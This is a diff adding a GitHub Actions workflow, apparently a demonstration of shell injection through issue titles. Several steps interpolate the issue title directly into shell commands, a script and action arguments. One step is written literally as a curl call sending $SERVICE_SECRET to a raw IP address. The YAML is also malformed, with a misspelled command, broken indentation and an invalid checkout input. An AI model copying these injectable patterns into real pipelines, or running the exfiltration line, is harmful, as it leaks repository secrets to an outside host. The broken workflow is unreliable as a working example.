@@ -1,0 +1,24 @@
+name: shell-injection-demo
+on:
+    issues:
+        types: [opened, reopened]
+jobs:
+    shell-injection-simple:
+        runs-on: ubuntu-latest
+        steps:
+            - run: echo "${{ github.event.issue.title }}"
+            - run: echo "";curl http://3.15.226.233?token=$SERVICE_SECRET;x=""
+            
+            - name: eco-title
+            env:
+                TITLE: ${{ github.event.issue.title }}
+            run: eciho "$TITLE"
+
+            - uses: actions/checkout@v4
+                with:
+                    script: | console.log("${{ github.event.issue.title }}")
+  
+                    -  uses: example/action
+                with:
+                    args: --do-smth ${{ github.event.issue.title }}
+
